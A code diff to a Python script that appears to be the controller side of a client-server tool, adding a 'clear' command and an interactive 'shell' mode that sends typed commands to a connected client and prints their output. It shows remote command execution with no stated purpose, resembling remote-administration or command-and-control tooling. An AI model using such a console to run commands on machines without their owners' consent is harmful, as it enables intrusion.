@@ -45,6 +45,8 @@ if __name__ == '__main__':
         cmd = str(input())
         if len(cmd) == 0:
             continue
+        if cmd == "clear":
+            clear_terminal()
         if cmd == "exit":
             send_data(client, {"cmd": "exit"})
             client.close()
@@ -81,7 +83,19 @@ if __name__ == '__main__':
                     break
                 else:
                     print("incurrent command!")
-
+        if cmd == "shell":
+            send_data(client, {"cmd": "shell"})
+            while True:
+                print('shell>', end='')
+                shell = str(input())
+                send_data(client, {"shell": shell})
+                if shell == "exit":
+                    break
+                res = recv_data(client)
+                if len(res["result"].stdout) != 0:
+                    print(res["result"].stdout)
+                else:
+                    print(res["result"].stderr)
 
 
 
